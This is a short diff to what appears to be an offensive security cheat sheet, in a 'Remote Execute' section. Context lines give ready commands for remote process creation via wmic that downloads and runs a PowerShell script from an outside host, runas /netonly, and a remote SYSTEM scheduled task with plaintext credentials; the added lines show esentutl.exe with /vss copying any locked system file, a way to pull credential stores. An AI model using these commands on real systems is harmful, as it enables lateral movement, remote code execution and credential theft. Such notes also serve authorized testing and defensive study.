@@ -54,6 +54,8 @@ Remote Execute
     runas /netonly /user:domain\username powershell.exe
     wmic /node:10.0.0.6 /user:administrator process call create "powershell.exe iex (new-object net.webclient).downloadstring('http://10.10.5.10/update')"
     schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s dc-mantvydas /u user /p password
+    * COPY ANY SYSTEM FILE
+      C:\windows\system32\esentutl.exe /y <source-file> /vss /d <dest-file>
   
 File Share
   WebDav (Host File over port 80)
